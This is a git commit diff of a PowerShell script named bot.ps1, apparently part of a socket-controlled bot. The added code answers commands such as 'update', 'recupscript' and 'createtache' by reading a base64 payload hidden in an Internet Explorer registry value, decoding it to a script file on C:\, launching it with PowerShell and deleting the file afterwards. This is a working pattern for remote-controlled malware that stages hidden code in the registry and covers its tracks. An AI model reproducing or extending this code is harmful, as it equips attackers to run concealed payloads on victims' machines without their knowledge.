08d0386352b62fe6e804ba0d4f818b2ff1d3b547
theurtebize <t.heurtebize@outlook.com>
2020-02-16 13:29:14 +0100

    Update bot.ps1

--- bot.ps1
+++ bot.ps1
@@ -10,36 +10,29 @@ function global:FRX_Socket-MessageAction{
         {$_ -match "update"}{
             write-host "update en cours" -ForegroundColor green
             $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
-            $Decode=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($convert64))
-
-            <#
-            Il faut maintenant exploiter la clé pour exécuter la fonction
-
-            #>
+            $Decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($convert64)) | Out-File C:\update.ps1 
+            start powershell.exe ./update.ps1 
+            Start-Sleep -s 15
+            rm c:\update.ps1  # envoyer en paramètre la fonction.
 
             }
         {$_ -match "recupscript"       }{
             write-host "récupération du script en cours" -ForegroundColor green
             $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
-            $Decode=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($convert64))
-
-            <#
-            Il faut maintenant exploiter la clé pour exécuter la fonction
-
-            #>            
+            $Decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($convert64)) | Out-File c:\recup.ps1
+            start powershell.exe ./recup.ps1
+            Start-Sleep -s 15
+            rm C:\recup.ps1  # envoyer en paramètre la fonction.        
             
             
             }
         {$_ -match "createtache"       }{
             write-host "création de la tâche en cours" -ForegroundColor green
             $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
-            $Decode=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($convert64))
-
-            <#
-            Il faut maintenant exploiter la clé pour exécuter la fonction
-
-            #>            
-            
+            $Decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($convert64)) | Out-File c:\tache.ps1
+            start powershell.exe ./tache.ps1
+            Start-Sleep -s 15
+            rm c:\tache.ps1 # envoyer en paramètre la fonction.
             
             }
         Default {write-host $message}
